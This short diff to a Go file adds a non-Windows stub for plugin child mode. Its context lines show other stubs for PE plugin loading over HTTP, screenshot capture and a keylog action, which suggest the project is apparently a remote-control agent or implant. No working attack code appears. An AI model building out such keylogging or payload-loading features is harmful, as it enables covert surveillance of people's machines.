@@ -16,6 +16,10 @@ func loadPluginPE(*http.Client, *config, string, string, string) (string, error)
 	return "", errors.New("PE plugins require the Windows agent build")
 }
 
+func runPluginChild([]string) error {
+	return errors.New("plugin child mode requires the Windows agent build")
+}
+
 func captureScreenshot() (string, error) { return "", errors.New("screenshots require Windows") }
 
 func keylogAction(string) (string, string, error) {
